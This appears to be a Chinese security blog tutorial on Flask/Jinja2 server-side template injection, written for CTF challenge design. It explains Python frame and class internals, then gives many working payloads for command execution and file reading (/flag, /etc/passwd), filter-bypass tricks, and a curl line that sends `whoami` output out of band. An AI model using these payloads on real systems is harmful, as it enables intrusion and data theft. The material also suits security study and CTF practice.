
[Wendell](/u/18904) / 2020-07-28 09:44:58 / 浏览数 14650 

* * *

关于flask的中ssti的绕过文章还是很多的,但分析这样构造的原因还是挺少的,恰巧最近要出题,所以写一篇文章分析一下

## 前置知识

### python执行环境

Python 会根据作用域把代码编译成字节码,然后生成PyCodeObject 对象,然后PyCodeObject 对象在和PyFrameObject关联,PyFrameObject有运行所需的名字空间信息.

[![](https://xzfile.aliyuncs.com/media/upload/picture/20200716155959-58882322-c73a-1.png)
](https://xzfile.aliyuncs.com/media/upload/picture/20200716155959-58882322-c73a-1.png)

#### 对于一个module

[![](https://xzfile.aliyuncs.com/media/upload/picture/20200716160000-59222120-c73a-1.png)
](https://xzfile.aliyuncs.com/media/upload/picture/20200716160000-59222120-c73a-1.png)

local是,函数内的局部变量,global是模块内的全局变量,builtin是python内建函数,如open

利用sys._getframe() 获得当前Frame,打印结果如下

[![](https://xzfile.aliyuncs.com/media/upload/picture/20200716160001-59c8db46-c73a-1.png)
](https://xzfile.aliyuncs.com/media/upload/picture/20200716160001-59c8db46-c73a-1.png)

注意对于python来说,global只是局限于module的,也就是如果moduleA导入了moduleB,则执行moduleB的函数,作用域仅限于moduleB,如果moduleB导入了moduleC,但是对于A来说,moduleC是不可见的

#### 对于函数

python会依据,PyCodeObject对象和当前PyFrameObject对象生成,PyFunctionObject对象,PyFunctionObject中有两个重要的变量，func\_code, func\_globals。其中func\_code是函数对象对应的PyCodeObject，而func\_globals则是函数的global名字空间,可以通过python3 ,可以通过\_\_globals\_\_访问

#### 对于类

[![](https://xzfile.aliyuncs.com/media/upload/picture/20200716160002-5a494876-c73a-1.png)
](https://xzfile.aliyuncs.com/media/upload/picture/20200716160002-5a494876-c73a-1.png)

python的所有类是type的实例,又都继承自object类,因为python支持多继承,可以通过base,mro得到继承的父类

Python在初始化class对象时会填充tp\_dict,这个tp\_dict会用来搜索类的方法和属性的,其中对于一些特殊方法比如`__repr__`,开始指向一个默认的slot\_tp\_repr方法,如果在一个class中重新定义了`__repr__`方法，则在创建class对象的时候，就会将默认的tp\_repr指向的方法替换为该slot\_to_repr方法,并且python的\[1:2\]等操作,是可以通过这些特殊方法实现的.

python的方法其实是对PyFunctionObject的包装，封装成了PyMethodObject对象，这个对象除了PyFunctionObject对象本身，还新增了class对象和成员函数调用的self参数

### Flask/Jinja2

作为 web层面的攻击,我们要关注语言层面的特性和绕过

参考文档如下:

[https://jinja.palletsprojects.com/en/2.11.x/templates/#list-of-builtin-filters](https://jinja.palletsprojects.com/en/2.11.x/templates/#list-of-builtin-filters)

[https://dormousehole.readthedocs.io/en/latest/](https://dormousehole.readthedocs.io/en/latest/)

Flask/Jinja2 模板的语法,filters和内建函数,变量,都可能称为绕过的trick

基本语法如下:

*   {{ ... }} for [Expressions](https://jinja.palletsprojects.com/en/2.11.x/templates/#expressions) 里面可以是一个表达式,如1+1,字符串等,支持调用对象的方法,会渲染结果
    
*   `{% ... %}` for [Statements](https://jinja.palletsprojects.com/en/2.11.x/templates/#list-of-control-structures) ,可以实现for,if等语句,还支持set语法,可以给变量赋值

如

```python
{% set chr=().__class__.__bases__.__getitem__(0).__subclasses__()[59].__init__.__globals__.__builtins__.chr %}
```

找到chr函数,并且赋值给chr变量

## 命令执行构造

在`{{}}`我们可以执行表达式,但是命名空间是受限的,没有`builtins`,所以`eval`,`open`这些操作是不能使用的,但根据前面的知识,我们可以通过任意一个函数的`func_globals`而得到他们的命名空间,而得到`builtins`

### flask内置函数

这种方法之前好像没人提过

Flask 内置了两个函数url\_for 和 get\_flashed_messages,还有一些内置的对象

```
{{url_for.__globals__['__builtins__'].__import__('os').system('ls')}}
{{request.__init__.__globals__['__builtins__'].open('/flag').read()}}
```

如果过滤了config,又需要查config

```
{{config}}
{{get_flashed_messages.__globals__['current_app'].config}}
```

### 通过基类查找子类

虽然模块间的变量不共享,但是所有类都是object的子类,所以可以通过object类而得到其他类

利用

```
#python2.7
''.__class__.__mro__[2]
{}.__class__.__bases__[0]
().__class__.__bases__[0]
[].__class__.__bases__[0]
request.__class__.__mro__[1]
#python3.7
''.__class__.__mro__[1]
{}.__class__.__bases__[0]
().__class__.__bases__[0]
[].__class__.__bases__[0]
[].__class__.__base__
().__class__.__base__
{}.__class__.__base__
request.__class__.__mro__[1]
session.__class__.__mro__[1]
redirect.__class__.__mro__[1]
```

等得到object 对象,然后通过`__subclasses__()`方法,得到所有子类,在找重载过`__inti__,__repr__`等特殊方法的类,利用这些方法的`__globals__`得到,`__builtins__`,或者`os,codecs`等可以进行代码执行的调用.

常见payload

```
// 59 为warnings.WarningMessag
''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("ls").read()')
```

不使用globals的payload

```
// <class 'warnings.catch_warnings'>类在在内部定义了_module=sys.modules['warnings']，然后warnings模块包含有__builtins__,
如果可以找到warnings.catch_warnings类,则可以不使用  globals

''.__class__.__mro__[2].__subclasses__()[60]()._module.__builtins__['__import__']("os").system("calc")
```

## 过滤绕过

#### 前置知识

*   利用python的魔术方法,也可以实现字典,数组取值等操作
    
*   Jinja2对模板做了特殊处理,所以通过
    

```
A['__init__']
```

也可以访问A的方法,属性

*   Jinja2 的attr 过滤器可以获得对象的属性或方法
    
*   flask内置的request对象可以得到请求的信息
    
    ```
    request.args.name
    request.cookies.name
    request.headers.name
    request.values.name
    request.form.name
    ```
    

### 关键字过滤

#### 没过滤引号

*   如果没用过滤引号,使用反转,或者各种拼接绕过

```
{{''.__class__.__mro__[1].__subclasses__()[59].__init__.__globals__['__snitliub__'[::-1]]['eval']('__import__("os").popen("ls").read()')}}

{{''.__class__.__mro__[1].__subclasses__()[59].__init__.__globals__['__buil'+'tins__'[::-1]]['eval']('__import__("os").popen("ls").read()')}}
```

#### 过滤了引号

*   利用将需要的变量放在请求中,然后通过\[\],或者通过attr,`__getattribute__`获得

```
// url?a=eval
''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__.__builtins__.[request.args.a]('__import__("os").popen("ls").read()')

// Cookie: aa=__class__;bb=__mro__;cc=__subclasses__
{{((request|attr(request.cookies.get('aa'))|attr(request.cookies.get('bb'))|list).pop(-1))|attr(request.cookies.get('cc'))()}}
```

*   如果request被ban,可以考虑通过`{{(config.__str__()[2])+(config.__str__()[3])}}`拼接需要的字符
    
*   查出chr函数,利用set赋值,然后使用
    

```
{% set chr=().__class__.__bases__.__getitem__(0).__subclasses__()[59].__init__.__globals__.__builtins__.chr %}{{ ().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(chr(47)%2bchr(101)%2bchr(116)%2bchr(99)%2bchr(47)%2bchr(112)%2bchr(97)%2bchr(115)%2bchr(115)%2bchr(119)%2bchr(100)).read() }}
```

*   利用内置过滤器拼接出,'%c',再利用''%语法得到任意字符

```
get %
找到特殊字符<,url编码,得到%
{%set pc = g|lower|list|first|urlencode|first%}


get 'c'

{%set c=dict(c=1).keys()|reverse|first%}

字符串拼接

{%set udl=dict(a=pc,c=c).values()|join %}

可以得到任意字符了

get _
{%set udl2=udl%(95)%}{{udl}}
```

### 特殊字符过滤

其他奇奇怪怪的过滤,善用Flask/Jinja2的文档,用内置过滤器,函数,变量,魔术方法等绕过

#### 过滤\[

```
#getitem、pop
''.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)('/etc/passwd').read()
''.__class__.__mro__.__getitem__(2).__subclasses__().pop(59).__init__.func_globals.linecache.os.popen('ls').read()
''.__class__.__mro__.__getitem__(2).__subclasses__().__getitem__(59).__init__.__globals__.__getitem__('__builtins__').__getitem__('__import__')('os').system('calc')
```

#### 过滤双花括号

```
#用{%%}标记
{% if ''.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen('curl http://127.0.0.1:7999/?i=`whoami`').read()=='p' %}1{% endif %}
这样会没有回显,考虑带外或者盲注

# 用{%print%}标记,有回显
{%print config%}
```

#### 过滤下划线

和过滤字符串一样绕过即可

## 参考资料

[https://misakikata.github.io/2020/04/python-%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E4%B8%8ESSTI/#%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%A0%BC%E5%BC%8F%E5%8C%96](https://misakikata.github.io/2020/04/python-沙箱逃逸与SSTI/#字符串格式化)

[https://www.mi1k7ea.com/2019/05/31/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%B0%8F%E7%BB%93/](https://www.mi1k7ea.com/2019/05/31/Python沙箱逃逸小结/)

[https://xi4or0uji.github.io/2019/01/15/flask%E4%B9%8Bssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/#%E6%94%BB%E5%87%BB](https://xi4or0uji.github.io/2019/01/15/flask之ssti模板注入/#攻击)

[https://www.mi1k7ea.com/2019/06/02/%E6%B5%85%E6%9E%90Python-Flask-SSTI/](https://www.mi1k7ea.com/2019/06/02/浅析Python-Flask-SSTI/)

[https://xz.aliyun.com/t/52](https://xz.aliyun.com/t/52)

[https://hatboy.github.io/2018/04/19/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E6%80%BB%E7%BB%93](https://hatboy.github.io/2018/04/19/Python沙箱逃逸总结)
